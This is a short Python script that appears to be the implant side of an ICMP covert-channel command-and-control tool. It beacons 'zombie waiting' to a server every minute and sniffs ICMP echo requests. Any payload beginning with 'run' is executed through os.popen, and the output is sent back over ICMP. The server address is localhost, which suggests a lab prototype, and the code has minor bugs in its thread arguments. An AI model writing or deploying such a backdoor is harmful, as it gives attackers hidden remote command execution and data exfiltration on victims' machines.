
from icmp_c2_modules import *

server_adr = "127.0.0.1"
zombie_msg = "zombie waiting"
ICMP_REQUEST = "icmp[0]=0"

print("hello")
def beacon_func(addr,data):
    while 1:
        pkt_send(dest=server_adr,data=zombie_msg)
        print("send beacon")
        time.sleep(60)
    
#pkt_send(dest=server_adr,data="waiting")
args_tuple = (server_adr,zombie_msg)
new_thread = Thread(target=beacon_func,args=args_tuple)
new_thread.start()

def RunCommand(cmd):
    output_stream = os.popen(cmd)
    pkt_send(dest=server_adr,data=output_stream.read())
    
    
def parse_packet(packet):
    new_thread
    if Raw in packet:
        try:
            data_recieved = packet[0][Raw].load.decode('utf-8')
        except:
            return
        if data_recieved.lower().startswith('run'):
            cmd = data_recieved.split()
            # send the parsed command without the word run
            
            #RunCommand(" ".join(cmd[1:]))  
            new_thread = Thread(target=RunCommand,args=" ".join(cmd[1:]))
            new_thread.start()
            
            

# Start sniffing packets

capture = sniff(filter="icmp[0]=8",prn=parse_packet) 
 








#def pkt_send(dest,data):
    # sendp(IP(dst=dest)/ICMP()/data)

#def sniff_pkt():
    # capture = sniff(filter="icmp or icmp[0]=8",count=1,prn=parse_packet)
    # print(capture)

#def parse_packet(packet):
    # if Raw in packet:
        # data_recieved = packet[Raw].load
    # print(data_recieved)

#while 1:  
    # pkt_send("8.8.8.8","check data")
    # time.sleep(2)
    
 